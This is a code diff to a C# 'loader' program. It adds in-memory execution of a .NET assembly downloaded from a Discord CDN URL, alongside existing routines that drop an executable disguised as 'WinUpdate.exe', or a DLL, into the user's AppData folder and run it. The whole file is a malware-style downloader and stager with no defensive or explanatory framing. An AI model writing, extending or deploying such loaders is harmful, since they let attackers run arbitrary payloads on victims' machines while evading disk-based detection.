@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Net;
+using System.Net.Http;
+using System.Reflection;
 
 namespace loader {
     public class Program {
@@ -25,11 +27,44 @@ namespace loader {
 
         public static void PortableExecutableLoader(string remotePEUrl, string localPEName) {
             string currentUser = Environment.UserName;
-            GetFile(remotePEUrl);
+            GetFile(remotePEUrl, localPEName);
             string localPEPath = $@"C:\Users\{currentUser}\AppData\Roaming\{localPEName}";
             string command = $"/c {localPEPath}";
             RunCommand(command);
         }
+
+        private static byte[] GetModule(string url)
+        {
+            HttpClient client = new HttpClient();
+            HttpResponseMessage response = client.GetAsync(url).Result;
+            response.EnsureSuccessStatusCode();
+            byte[] module = response.Content.ReadAsByteArrayAsync().Result;
+            return module;
+        }
+
+        public static void ExecuteManagedAssembly(byte[] assemblyBytes)
+        {
+            try 
+            {
+                Assembly assembly = Assembly.Load(assemblyBytes);
+                MethodInfo method = assembly.EntryPoint;
+                object execute = method.Invoke(null, null);
+                Console.WriteLine("Assembly executed");
+            }
+            catch (Exception e)
+            {
+                string error = e.ToString();
+                Console.WriteLine($"Error executing assembly: {e}");
+            }
+        }
+
+        public static void ExecAssembly(string url)
+        {
+            byte[] asm = GetModule(url);
+            ExecuteManagedAssembly(asm);
+        }
+
+
 
         public static void DllLoader(string remoteDllUrl, string localDllName, string dllEntryName) {
             string currentUser = Environment.UserName;
@@ -41,9 +76,17 @@ namespace loader {
 
         public static void Main(string[] args) {
 
-            string remotePEUrl = "https://cdn.discordapp.com/attachments/804752207312322571/952222704835121242/WinUpdate.exe";
-            string localPEName = "WinUpdate.exe";
-            PortableExecuatbleLoader(remotePEUrl, localPEName);
+            //string remotePEUrl = "https://cdn.discordapp.com/attachments/804752207312322571/952222704835121242/WinUpdate.exe";
+            //string localPEName = "WinUpdate.exe";
+            //PortableExecuatbleLoader(remotePEUrl, localPEName);
+
+            // string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947621052064890890/example.dll";
+            // string localDllName = "messagebox.dll";
+            // string dllEntryName = "Test";
+            // DllLoader(remoteDllUrl, localDllName, dllEntryName);
+
+            string assembly = "https://cdn.discordapp.com/attachments/804752207312322571/947621052064890890/example.dll";
+            ExecAssembly(assembly);
         }
     }
 }
